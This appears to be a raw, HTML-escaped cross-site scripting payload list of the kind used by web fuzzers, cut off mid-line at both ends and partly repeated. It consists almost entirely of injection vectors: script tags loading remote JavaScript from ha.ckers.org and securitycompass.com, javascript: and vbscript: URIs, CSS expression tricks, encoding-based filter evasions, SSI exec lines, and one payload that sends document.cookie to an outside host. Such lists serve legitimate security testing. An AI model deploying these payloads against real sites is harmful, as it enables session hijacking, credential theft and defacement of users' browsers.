Content=\"&lt;http://www.securitycompass.com/xss.css&gt;; REL=stylesheet\"&gt;\n&lt;style&gt;BODY{-moz-binding:url(\"http://www.securitycompass.com/xssmoz.xml#xss\")}&lt;/style&gt;\n&lt;OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://www.securitycompass.com/scriptlet.html\"&gt;&lt;/object&gt;\n&lt;HTML xmlns:xss&gt;&lt;?import namespace=\"xss\" implementation=\"http://www.securitycompass.com/xss.htc\"&gt;&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;&lt;/html&gt;\n&lt;script SRC=\"http://www.securitycompass.com/xss.jpg\"&gt;&lt;/script&gt;\n&lt;!--#exec cmd=\"/bin/echo '&lt;SCR'\"--&gt;&lt;!--#exec cmd=\"/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js&gt;&lt;/SCRIPT&gt;'\"--&gt;\n&lt;script a=\"&gt;\" SRC=\"http://www.securitycompass.com/xss.js\"&gt;&lt;/script&gt;\n&lt;script =\"&gt;\" SRC=\"http://www.securitycompass.com/xss.js\"&gt;&lt;/script&gt;\n&lt;script a=\"&gt;\" '' SRC=\"http://www.securitycompass.com/xss.js\"&gt;&lt;/script&gt;\n&lt;script \"a='&gt;'\" SRC=\"http://www.securitycompass.com/xss.js\"&gt;&lt;/script&gt;\n&lt;script a=`&gt;` SRC=\"http://www.securitycompass.com/xss.js\"&gt;&lt;/script&gt;\n&lt;script a=\"&gt;'&gt;\" SRC=\"http://www.securitycompass.com/xss.js\"&gt;&lt;/script&gt;\n&lt;script&gt;document.write(\"&lt;SCRI\");&lt;/SCRIPT&gt;PT SRC=\"http://www.securitycompass.com/xss.js\"&gt;&lt;/script&gt;\n&lt;div style=\"binding: url(http://www.securitycompass.com/xss.js);\"&gt; [Mozilla]\n&amp;quot;&amp;gt;&amp;lt;BODY onload!#$%&amp;amp;()*~+-_.,:;?@[/|\\]^`=alert(&amp;quot;XSS&amp;quot;)&amp;gt;\n&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;\n&amp;lt;/br style=a:expression(alert())&amp;gt;\n&amp;lt;scrscriptipt&amp;gt;alert(1)&amp;lt;/scrscriptipt&amp;gt;\n&amp;lt;br size=\\&amp;quot;&amp;amp;{alert(&amp;#039;XSS&amp;#039;)}\\&amp;quot;&amp;gt;\nperl -e &amp;#039;print \\&amp;quot;&amp;lt;IMG SRC=java\\0script:alert(\\&amp;quot;XSS\\&amp;quot;)&amp;gt;\\&amp;quot;;&amp;#039; &amp;gt; out\nperl -e &amp;#039;print \\&amp;quot;&amp;lt;SCR\\0IPT&amp;gt;alert(\\&amp;quot;XSS\\&amp;quot;)&amp;lt;/SCR\\0IPT&amp;gt;\\&amp;quot;;&amp;#039; &amp;gt; out\n&lt;~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))&gt;\n&lt;~/XSS/*-*/STYLE=xss:e/**/xpression(window.location=\"http://www.procheckup.com/?sid=\"%2bdocument.cookie)&gt;\n&lt;~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))&gt;\n&lt;~/XSS STYLE=xss:expression(alert('XSS'))&gt;\n\"&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;\n&lt;/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))&gt;\nXSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))&gt;\nXSS STYLE=xss:e/**/xpression(alert('XSS'))&gt;\n&lt;/XSS STYLE=xss:expression(alert('XSS'))&gt;\n';;alert(String.fromCharCode(88,83,83))//\\';;alert(String.fromCharCode(88,83,83))//\";;alert(String.fromCharCode(88,83,83))//\\\";;alert(String.fromCharCode(88,83,83))//--&gt;;&lt;;/SCRIPT&gt;;\";&gt;;';&gt;;&lt;;SCRIPT&gt;;alert(String.fromCharCode(88,83,83))&lt;;/SCRIPT&gt;;\n';';;!--\";&lt;;XSS&gt;;=&amp;;{()}\n&lt;;SCRIPT&gt;;alert(';XSS';)&lt;;/SCRIPT&gt;;\n&lt;;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;;&lt;;/SCRIPT&gt;;\n&lt;;SCRIPT&gt;;alert(String.fromCharCode(88,83,83))&lt;;/SCRIPT&gt;;\n&lt;;BASE HREF=\";javascript:alert(';XSS';);//\";&gt;;\n&lt;;BGSOUND SRC=\";javascript:alert(';XSS';);\";&gt;;\n&lt;;BODY BACKGROUND=\";javascript:alert(';XSS';);\";&gt;;\n&lt;;BODY ONLOAD=alert(';XSS';)&gt;;\n&lt;;DIV STYLE=\";background-image: url(javascript:alert(';XSS';))\";&gt;;\n&lt;;DIV STYLE=\";background-image: url(&amp;;#1;javascript:alert(';XSS';))\";&gt;;\n&lt;;DIV STYLE=\";width: expression(alert(';XSS';));\";&gt;;\n&lt;;FRAMESET&gt;;&lt;;FRAME SRC=\";javascript:alert(';XSS';);\";&gt;;&lt;;/FRAMESET&gt;;\n&lt;;IFRAME SRC=\";javascript:alert(';XSS';);\";&gt;;&lt;;/IFRAME&gt;;\n&lt;;INPUT TYPE=\";IMAGE\"; SRC=\";javascript:alert(';XSS';);\";&gt;;\n&lt;;IMG SRC=\";javascript:alert(';XSS';);\";&gt;;\n&lt;;IMG SRC=javascript:alert(';XSS';)&gt;;\n&lt;;IMG DYNSRC=\";javascript:alert(';XSS';);\";&gt;;\n&lt;;IMG LOWSRC=\";javascript:alert(';XSS';);\";&gt;;\n&lt;;IMG SRC=\";http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\";&gt;;\nRedirect 302 /a.jpg http://victimsite.com/admin.asp&amp;;deleteuser\nexp/*&lt;;XSS STYLE=';no\\xss:noxss(\";*//*\";);\n&lt;;STYLE&gt;;li {list-style-image: url(\";javascript:alert(&amp;#39;XSS&amp;#39;)\";);}&lt;;/STYLE&gt;;&lt;;UL&gt;;&lt;;LI&gt;;XSS\n&lt;;IMG SRC=';vbscript:msgbox(\";XSS\";)';&gt;;\n&lt;;LAYER SRC=\";http://ha.ckers.org/scriptlet.html\";&gt;;&lt;;/LAYER&gt;;\n&lt;;IMG SRC=\";livescript:[code]\";&gt;;\n%BCscript%BEalert(%A2XSS%A2)%BC/script%BE\n&lt;;META HTTP-EQUIV=\";refresh\"; CONTENT=\";0;url=javascript:alert(';XSS';);\";&gt;;\n&lt;;META HTTP-EQUIV=\";refresh\"; CONTENT=\";0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\";&gt;;\n&lt;;META HTTP-EQUIV=\";refresh\"; CONTENT=\";0; URL=http://;URL=javascript:alert(';XSS';);\";&gt;;\n&lt;;IMG SRC=\";mocha:[code]\";&gt;;\n&lt;;OBJECT TYPE=\";text/x-scriptlet\"; DATA=\";http://ha.ckers.org/scriptlet.html\";&gt;;&lt;;/OBJECT&gt;;\n&lt;;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;;&lt;;param name=url value=javascript:alert(';XSS';)&gt;;&lt;;/OBJECT&gt;;\n&lt;;EMBED SRC=\";http://ha.ckers.org/xss.swf\"; AllowScriptAccess=\";always\";&gt;;&lt;;/EMBED&gt;;\na=\";get\";;&amp;;#10;b=\";URL(\";\";;&amp;;#10;c=\";javascript:\";;&amp;;#10;d=\";alert(';XSS';);\";)\";;&amp;#10;eval(a+b+c+d);\n&lt;;STYLE TYPE=\";text/javascript\";&gt;;alert(';XSS';);&lt;;/STYLE&gt;;\n&lt;;IMG STYLE=\";xss:expr/*XSS*/ession(alert(';XSS';))\";&gt;;\n&lt;;XSS STYLE=\";xss:expression(alert(';XSS';))\";&gt;;\n&lt;;STYLE&gt;;.XSS{background-image:url(\";javascript:alert(';XSS';)\";);}&lt;;/STYLE&gt;;&lt;;A CLASS=XSS&gt;;&lt;;/A&gt;;\n&lt;;STYLE type=\";text/css\";&gt;;BODY{background:url(\";javascript:alert(';XSS';)\";)}&lt;;/STYLE&gt;;\n&lt;;LINK REL=\";stylesheet\"; HREF=\";javascript:alert(';XSS';);\";&gt;;\n&lt;;LINK REL=\";stylesheet\"; HREF=\";http://ha.ckers.org/xss.css\";&gt;;\n&lt;;STYLE&gt;;@import';http://ha.ckers.org/xss.css';;&lt;;/STYLE&gt;;\n&lt;;META HTTP-EQUIV=\";Link\"; Content=\";&lt;;http://ha.ckers.org/xss.css&gt;;; REL=stylesheet\";&gt;;\n&lt;;STYLE&gt;;BODY{-moz-binding:url(\";http://ha.ckers.org/xssmoz.xml#xss\";)}&lt;;/STYLE&gt;;\n&lt;;TABLE BACKGROUND=\";javascript:alert(';XSS';)\";&gt;;&lt;;/TABLE&gt;;\n&lt;;TABLE&gt;;&lt;;TD BACKGROUND=\";javascript:alert(';XSS';)\";&gt;;&lt;;/TD&gt;;&lt;;/TABLE&gt;;\n&lt;;HTML xmlns:xss&gt;;\n&lt;;XML ID=I&gt;;&lt;;X&gt;;&lt;;C&gt;;&lt;;![CDATA[&lt;;IMG SRC=\";javas]]&gt;;&lt;;![CDATA[cript:alert(';XSS';);\";&gt;;]]&gt;;\n&lt;;XML ID=\";xss\";&gt;;&lt;;I&gt;;&lt;;B&gt;;&lt;;IMG SRC=\";javas&lt;;!-- --&gt;;cript:alert(';XSS';)\";&gt;;&lt;;/B&gt;;&lt;;/I&gt;;&lt;;/XML&gt;;\n&lt;;XML SRC=\";http://ha.ckers.org/xsstest.xml\"; ID=I&gt;;&lt;;/XML&gt;;\n&lt;;HTML&gt;;&lt;;BODY&gt;;\n&lt;;!--[if gte IE 4]&gt;;           \n&lt;;META HTTP-EQUIV=\";Set-Cookie\"; Content=\";USERID=&lt;;SCRIPT&gt;;alert(';XSS';)&lt;;/SCRIPT&gt;;\";&gt;;\n&lt;;XSS STYLE=\";behavior: url(http://ha.ckers.org/xss.htc);\";&gt;;\n&lt;;SCRIPT SRC=\";http://ha.ckers.org/xss.jpg\";&gt;;&lt;;/SCRIPT&gt;;\n&lt;;!--#exec cmd=\";/bin/echo ';&lt;;SCRIPT SRC';\";--&gt;;&lt;;!--#exec cmd=\";/bin/echo ';=http://ha.ckers.org/xss.js&gt;;&lt;;/SCRIPT&gt;;';\";--&gt;;\n&lt;;? echo(';&lt;;SCR)';;\n&lt;;BR SIZE=\";&amp;;{alert(';XSS';)}\";&gt;;\n&lt;;IMG SRC=JaVaScRiPt:alert(';XSS';)&gt;;\n&lt;;IMG SRC=javascript:alert(&amp;;quot;XSS&amp;;quot;)&gt;;\n&lt;;IMG SRC=`javascript:alert(\";RSnake says, ';XSS';\";)`&gt;;\n&lt;;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;;\n&lt;;IMG RC=&amp;;#106;&amp;;#97;&amp;;#118;&amp;;#97;&amp;;#115;&amp;;#99;&amp;;#114;&amp;;#105;&amp;;#112;&amp;;#116;&amp;;#58;&amp;;#97;&amp;;#108;&amp;;#101;&amp;;#114;&amp;;#116;&amp;;#40;&amp;;#39;&amp;;#88;&amp;;#83;&amp;;#83;&amp;;#39;&amp;;#41;&gt;;\n&lt;;IMG RC=&amp;;#0000106&amp;;#0000097&amp;;#0000118&amp;;#0000097&amp;;#0000115&amp;;#0000099&amp;;#0000114&amp;;#0000105&amp;;#0000112&amp;;#0000116&amp;;#0000058&amp;;#0000097&amp;;#0000108&amp;;#0000101&amp;;#0000114&amp;;#0000116&amp;;#0000040&amp;;#0000039&amp;;#0000088&amp;;#0000083&amp;;#0000083&amp;;#0000039&amp;;#0000041&gt;;\n&lt;;DIV STYLE=\";background-image:\\0075\\0072\\006C\\0028';\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.10530053\\0027\\0029';\\0029\";&gt;;\n&lt;;IMG SRC=&amp;;#x6A&amp;;#x61&amp;;#x76&amp;;#x61&amp;;#x73&amp;;#x63&amp;;#x72&amp;;#x69&amp;;#x70&amp;;#x74&amp;;#x3A&amp;;#x61&amp;;#x6C&amp;;#x65&amp;;#x72&amp;;#x74&amp;;#x28&amp;;#x27&amp;;#x58&amp;;#x53&amp;;#x53&amp;;#x27&amp;;#x29&gt;;\n&lt;;HEAD&gt;;&lt;;META HTTP-EQUIV=\";CONTENT-TYPE\"; CONTENT=\";text/html; charset=UTF-7\";&gt;; &lt;;/HEAD&gt;;+ADw-SCRIPT+AD4-alert(';XSS';);+ADw-/SCRIPT+AD4-\n\\\";;alert(';XSS';);//\n&lt;;/TITLE&gt;;&lt;;SCRIPT&gt;;alert(\"XSS\");&lt;;/SCRIPT&gt;;\n&lt;;STYLE&gt;;@im\\port';\\ja\\vasc\\ript:alert(\";XSS\";)';;&lt;;/STYLE&gt;;\n&lt;;IMG SRC=\";jav&amp;#x09;ascript:alert(';XSS';);\";&gt;;\n&lt;;IMG SRC=\";jav&amp;;#x09;ascript:alert(';XSS';);\";&gt;;\n&lt;;IMG SRC=\";jav&amp;;#x0A;ascript:alert(';XSS';);\";&gt;;\n&lt;;IMG SRC=\";jav&amp;;#x0D;ascript:alert(';XSS';);\";&gt;;\n&lt;;IMG&amp;#x0D;SRC&amp;#x0D;=&amp;#x0D;\";&amp;#x0D;j&amp;#x0D;a&amp;#x0D;v&amp;#x0D;a&amp;#x0D;s&amp;#x0D;c&amp;#x0D;r&amp;#x0D;i&amp;#x0D;p&amp;#x0D;t&amp;#x0D;:&amp;#x0D;a&amp;#x0D;l&amp;#x0D;e&amp;#x0D;r&amp;#x0D;t&amp;#x0D;&amp;#x0D;';&amp;#x0D;X&amp;#x0D;S&amp;#x0D;S&amp;#x0D;';&amp;#x0D;)&amp;#x0D;\";&amp;#x0D;&gt;;&amp;#x0D;\nperl -e ';print \";&lt;;IM SRC=java\\0script:alert(\";XSS\";)&gt;\";;';&gt;; out\nperl -e ';print \";&amp;;&lt;;SCR\\0IPT&gt;;alert(\";XSS\";)&lt;;/SCR\\0IPT&gt;;\";;'; &gt;; out\n&lt;;IMG SRC=\"; &amp;;#14;  javascript:alert(';XSS';);\";&gt;;\n&lt;;SCRIPT/XSS SRC=\";http://ha.ckers.org/xss.js\";&gt;;&lt;;/SCRIPT&gt;;\n&lt;;BODY onload!#$%&amp;;()*~+-_.,:;?@[/|\\]^`=alert(\";XSS\";)&gt;;\n&lt;;SCRIPT SRC=http://ha.ckers.org/xss.js\n&lt;;SCRIPT SRC=//ha.ckers.org/.j&gt;;\n&lt;;IMG SRC=\";javascript:alert(';XSS';)\";\n&lt;;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt;;\n&lt;;&lt;;SCRIPT&gt;;alert(\";XSS\";);//&lt;;&lt;;/SCRIPT&gt;;\n&lt;;IMG \";\";\";&gt;;&lt;;SCRIPT&gt;;alert(\";XSS\";)&lt;;/SCRIPT&gt;;\";&gt;;\n&lt;;SCRIPT&gt;;a=/XSS/\n&lt;;SCRIPT a=\";&gt;;\"; SRC=\";http://ha.ckers.org/xss.js\";&gt;;&lt;;/SCRIPT&gt;;\n&lt;;SCRIPT =\";blah\"; SRC=\";http://ha.ckers.org/xss.js\";&gt;;&lt;;/SCRIPT&gt;;\n&lt;;SCRIPT a=\";blah\"; ';'; SRC=\";http://ha.ckers.org/xss.js\";&gt;;&lt;;/SCRIPT&gt;;\n&lt;;SCRIPT \";a=';&gt;;';\"; SRC=\";http://ha.ckers.org/xss.js\";&gt;;&lt;;/SCRIPT&gt;;\n&lt;;SCRIPT a=`&gt;;` SRC=\";http://ha.ckers.org/xss.js\";&gt;;&lt;;/SCRIPT&gt;;\n&lt;;SCRIPT&gt;;document.write(\";&lt;;SCRI\";);&lt;;/SCRIPT&gt;;PT SRC=\";http://ha.ckers.org/xss.js\";&gt;;&lt;;/SCRIPT&gt;;\n&lt;;SCRIPT a=\";&gt;';&gt;\"; SRC=\";http://ha.ckers.org/xss.js\";&gt;;&lt;;/SCRIPT&gt;;\n&lt;;A HREF=\";http://66.102.7.147/\";&gt;;XSS&lt;;/A&gt;;\n&lt;;A HREF=\";http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\";&gt;;XSS&lt;;/A&gt;;\n&lt;;A HREF=\";http://1113982867/\";&gt;;XSS&lt;;/A&gt;;\n&lt;;A HREF=\";http://0x42.0x0000066.0x7.0x93/\";&gt;;XSS&lt;;/A&gt;;\n&lt;;A HREF=\";http://0102.0146.0007.00000223/\";&gt;;XSS&lt;;/A&gt;;\n&lt;;A HREF=\";h&amp;#x0A;tt&amp;#09;p://6&amp;;#09;6.000146.0x7.147/\";&gt;;XSS&lt;;/A&gt;;\n&lt;;A HREF=\";//www.google.com/\";&gt;;XSS&lt;;/A&gt;;\n&lt;;A HREF=\";//google\";&gt;;XSS&lt;;/A&gt;;\n&lt;;A HREF=\";http://ha.ckers.org@google\";&gt;;XSS&lt;;/A&gt;;\n&lt;;A HREF=\";http://google:ha.ckers.org\";&gt;;XSS&lt;;/A&gt;;\n&lt;;A HREF=\";http://google.com/\";&gt;;XSS&lt;;/A&gt;;\n&lt;;A HREF=\";http://www.google.com./\";&gt;;XSS&lt;;/A&gt;;\n&lt;;A HREF=\";javascript:document.location=';http://www.google.com/';\";&gt;;XSS&lt;;/A&gt;;\n&lt;;A HREF=\";http://www.gohttp://www.google.com/ogle.com/\";&gt;;XSS&lt;;/A&gt;;\n&lt;script&gt;document.vulnerable=true;&lt;/script&gt;\n&lt;img SRC=\"jav ascript:document.vulnerable=true;\"&gt;\n&lt;img SRC=\"javascript:document.vulnerable=true;\"&gt;\n&lt;img SRC=\" &amp;#14; javascript:document.vulnerable=true;\"&gt;\n&lt;body onload!#$%&amp;()*~+-_.,:;?@[/|\\]^`=document.vulnerable=true;&gt;\n&lt;&lt;SCRIPT&gt;document.vulnerable=true;//&lt;&lt;/SCRIPT&gt;\n&lt;script &lt;B&gt;document.vulnerable=true;&lt;/script&gt;\n&lt;img SRC=\"javascript:document.vulnerable=true;\"\n&lt;iframe src=\"javascript:document.vulnerable=true; &lt;\n&lt;script&gt;a=/XSS/\\ndocument.vulnerable=true;&lt;/script&gt;\n\\\";document.vulnerable=true;;//\n&lt;/title&gt;&lt;SCRIPT&gt;document.vulnerable=true;&lt;/script&gt;\n&lt;input TYPE=\"IMAGE\" SRC=\"javascript:document.vulnerable=true;\"&gt;\n&lt;body BACKGROUND=\"javascript:document.vulnerable=true;\"&gt;\n&lt;body ONLOAD=document.vulnerable=true;&gt;\n&lt;img DYNSRC=\"javascript:document.vulnerable=true;\"&gt;\n&lt;img LOWSRC=\"javascript:document.vulnerable=true;\"&gt;\n&lt;bgsound SRC=\"javascript:document.vulnerable=true;\"&gt;\n&lt;br SIZE=\"&amp;{document.vulnerable=true}\"&gt;\n&lt;LAYER SRC=\"javascript:document.vulnerable=true;\"&gt;&lt;/LAYER&gt;\n&lt;link REL=\"stylesheet\" HREF=\"javascript:document.vulnerable=true;\"&gt;\n&lt;style&gt;li {list-style-image: url(\"javascript:document.vulnerable=true;\");&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS\n&lt;img SRC='vbscript:document.vulnerable=true;'&gt;\n1script3document.vulnerable=true;1/script3\n&lt;meta HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:document.vulnerable=true;\"&gt;\n&lt;meta HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:document.vulnerable=true;\"&gt;\n&lt;IFRAME SRC=\"javascript:document.vulnerable=true;\"&gt;&lt;/iframe&gt;\n&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript:document.vulnerable=true;\"&gt;&lt;/frameset&gt;\n&lt;table BACKGROUND=\"javascript:document.vulnerable=true;\"&gt;\n&lt;table&gt;&lt;TD BACKGROUND=\"javascript:document.vulnerable=true;\"&gt;\n&lt;div STYLE=\"background-image: url(javascript:document.vulnerable=true;)\"&gt;\n&lt;div STYLE=\"background-image: url(&amp;#1;javascript:document.vulnerable=true;)\"&gt;\n&lt;div STYLE=\"width: expression(document.vulnerable=true);\"&gt;\n&lt;style&gt;@im\\port'\\ja\\vasc\\ript:document.vulnerable=true';&lt;/style&gt;\n&lt;img STYLE=\"xss:expr/*XSS*/ession(document.vulnerable=true)\"&gt;\n&lt;XSS STYLE=\"xss:expression(document.vulnerable=true)\"&gt;\nexp/*&lt;A STYLE='no\\xss:noxss(\"*//*\");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'&gt;\n&lt;style TYPE=\"text/javascript\"&gt;document.vulnerable=true;&lt;/style&gt;\n&lt;style&gt;.XSS{background-image:url(\"javascript:document.vulnerable=true\");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/a&gt;\n&lt;style type=\"text/css\"&gt;BODY{background:url(\"javascript:document.vulnerable=true\")}&lt;/style&gt;\n&lt;!--[if gte IE 4]&gt;&lt;SCRIPT&gt;document.vulnerable=true;&lt;/SCRIPT&gt;&lt;![endif]--&gt;\n&lt;base HREF=\"javascript:document.vulnerable=true;//\"&gt;\n&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:document.vulnerable=true&gt;&lt;/object&gt;\n&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![&lt;IMG SRC=\"javas]]&lt;![cript:document.vulnerable=true;\"&gt;]]&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/span&gt;\n&lt;XML ID=\"xss\"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\"javas&lt;!-- --&gt;cript:document.vulnerable=true\"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;&lt;SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"&gt;&lt;/span&gt;\n&lt;html&gt;&lt;BODY&gt;&lt;?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"&gt;&lt;?import namespace=\"t\" implementation=\"#default#time2\"&gt;&lt;t:set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;document.vulnerable=true&lt;/SCRIPT&gt;\"&gt;&lt;/BODY&gt;&lt;/html&gt;\n&lt;? echo('&lt;SCR)';echo('IPT&gt;document.vulnerable=true&lt;/SCRIPT&gt;'); ?&gt;\n&lt;meta HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;document.vulnerable=true&lt;/SCRIPT&gt;\"&gt;\n&lt;head&gt;&lt;META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-\n&lt;a href=\"javascript#document.vulnerable=true;\"&gt;\n&lt;div onmouseover=\"document.vulnerable=true;\"&gt;\n&lt;img src=\"javascript:document.vulnerable=true;\"&gt;\n&lt;img dynsrc=\"javascript:document.vulnerable=true;\"&gt;\n&lt;input type=\"image\" dynsrc=\"javascript:document.vulnerable=true;\"&gt;\n&lt;bgsound src=\"javascript:document.vulnerable=true;\"&gt;\n&amp;&lt;script&gt;document.vulnerable=true;&lt;/script&gt;\n&amp;{document.vulnerable=true;};\n&lt;img src=&amp;{document.vulnerable=true;};&gt;\n&lt;link rel=\"stylesheet\" href=\"javascript:document.vulnerable=true;\"&gt;\n&lt;iframe src=\"vbscript:document.vulnerable=true;\"&gt;\n&lt;img src=\"mocha:document.vulnerable=true;\"&gt;\n&lt;img src=\"livescript:document.vulnerable=true;\"&gt;\n&lt;a href=\"about:&lt;script&gt;document.vulnerable=true;&lt;/script&gt;\"&gt;\n&lt;meta http-equiv=\"refresh\" content=\"0;url=javascript:document.vulnerable=true;\"&gt;\n&lt;body onload=\"document.vulnerable=true;\"&gt;\n&lt;div style=\"background-image: url(javascript:document.vulnerable=true;);\"&gt;\n&lt;div style=\"behaviour: url([link to code]);\"&gt;\n&lt;div style=\"binding: url([link to code]);\"&gt;\n&lt;div style=\"width: expression(document.vulnerable=true;);\"&gt;\n&lt;style type=\"text/javascript\"&gt;document.vulnerable=true;&lt;/style&gt;\n&lt;object classid=\"clsid:...\" codebase=\"javascript:document.vulnerable=true;\"&gt;\n&lt;style&gt;&lt;!--&lt;/style&gt;&lt;script&gt;document.vulnerable=true;//--&gt;&lt;/script&gt;\n&lt;&lt;script&gt;document.vulnerable=true;&lt;/script&gt;\n&lt;![&lt;!--]]&lt;script&gt;document.vulnerable=true;//--&gt;&lt;/script&gt;\n&lt;!-- -- --&gt;&lt;script&gt;document.vulnerable=true;&lt;/script&gt;&lt;!-- -- --&gt;\n&lt;img src=\"blah\"onmouseover=\"document.vulnerable=true;\"&gt;\n&lt;img src=\"blah&gt;\" onmouseover=\"document.vulnerable=true;\"&gt;\n&lt;xml src=\"javascript:document.vulnerable=true;\"&gt;\n&lt;xml id=\"X\"&gt;&lt;a&gt;&lt;b&gt;&lt;script&gt;document.vulnerable=true;&lt;/script&gt;;&lt;/b&gt;&lt;/a&gt;&lt;/xml&gt;\n&lt;div datafld=\"b\" dataformatas=\"html\" datasrc=\"#X\"&gt;&lt;/div&gt;\n[\\xC0][\\xBC]script&gt;document.vulnerable=true;[\\xC0][\\xBC]/script&gt;\n&lt;style&gt;@import'http://www.securitycompass.com/xss.css';&lt;/style&gt;\n&lt;meta HTTP-EQUIV=\"Link\" Content=\"&lt;http://www.securitycompass.com/xss.css&gt;; REL=stylesheet\"&gt;\n&lt;style&gt;BODY{-moz-binding:url(\"http://www.securitycompass.com/xssmoz.xml#xss\")}&lt;/style&gt;\n&lt;OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://www.securitycompass.com/scriptlet.html\"&gt;&lt;/object&gt;\n&lt;HTML xmlns:xss&gt;&lt;?import namespace=\"xss\" implementation=\"http://www.securitycompass.com/xss.htc\"&gt;&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;&lt;/html&gt;\n&lt;script SRC=\"http://www.securitycompass.com/xss.jpg\"&gt;&lt;/script&gt;\n&lt;!--#exec cmd=\"/bin/echo '&lt;SCR'\"--&gt;&lt;!--#exec cmd=\"/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js&gt;&lt;/SCRIPT&gt;'\"--&gt;\n&lt;script a=\"&gt;\" SRC=\"http://www.securitycompass.com/xss.js\"&gt;&lt;/script&gt;\n&lt;script =\"&gt;\" SRC=\"http://www.securitycompass.com/xss.js\"&gt;&lt;/script&gt;\n&lt;script a=\"&gt;\" '' SRC=\"http://www.securitycompass.com/xss.js\"&gt;&lt;/script&gt;\n&lt;script \"a='&gt;'\" SRC=\"http://www.securitycompass.com/xss.js\"&gt;&lt;/script&gt;\n&lt;script a=`&gt;` SRC=\"http://www.securitycompass.com/xss.js\"&gt;&lt;/script&gt;\n&lt;script a=\"&gt;'&gt;\" SRC=\"http://www.securitycompass.com/xss.js\"&gt;&lt;/script&gt;\n&lt;script&gt;document.write(\"&lt;SCRI\");&lt;/SCRIPT&gt;PT SRC=\"http://www.securitycompass.com/xss.js\"&gt;&lt;/script&gt;\n&lt;div style=\"binding: url(http://www.securitycompass.com/xss.js);\"&gt; [Mozilla]\n\";&gt;;&lt;;BODY onload!#$%&amp;;()*~+-_.,:;?@[/|\\]^`=alert(\";XSS\";)&gt;;\n&lt;;/script&gt;;&lt;;script&gt;;alert(1)&lt;;/script&gt;;\n&lt;;/br style=a:expression(alert())&gt;;\n&lt;;scrscriptipt&gt;;alert(1)&lt;;/scrscriptipt&gt;;\n&lt;;br size=\\\";&amp;;{alert(&amp;#039;XSS&amp;#039;)}\\\";&gt;;\nperl -e &amp;#039;print \\\";&lt;;IMG SRC=java\\0script:alert(\\\";XSS\\\";)&gt;;\\\";;&amp;#039; &gt;; out\nperl -e &amp;#039;print \\\";&lt;;SCR\\0IPT&gt;;alert(\\\";XSS\\\";)&lt;;/SCR\\0IPT&gt;;\\\";;&amp;#039; &gt;; out\n&lt;~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))&gt;\n&lt;~/XSS/*-*/STYLE=xss:e/**/xpression(window.location=\"http://www.procheckup.com/?sid=\"%2bdocument.cookie)&gt;\n&lt;~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))&gt;\n&lt;~/XSS STYLE=xss:expression(alert('XSS'))&gt;\n\"&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;\n&lt;/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))&gt;\nXSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))&gt;\nXSS STYLE=xss:e/**/xpression(alert('XSS'))&gt;\n&lt;/XSS STYLE=xss:expression(alert('XSS'))&gt;\n&gt;\"&gt;&lt;script&gt;alert(\"XSS\")&lt;/script&gt;&amp;\n\"&gt;&lt;STYLE&gt;@import\"javascript:alert('XSS')\";&lt;/STYLE&gt;\n&gt;\"'&gt;&lt;img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)&gt;\n&gt;%22%27&gt;&lt;img%20src%3d%22javascript:alert(%27%20XSS%27)%22&gt;\n'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'\n'';!--\"&lt;XSS&gt;=&amp;{()}\n&lt;IMG SRC=\"javascript:alert('XSS');\"&gt;\n&lt;IMG SRC=javascript:alert('XSS')&gt;\n&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;\n&lt;IMG 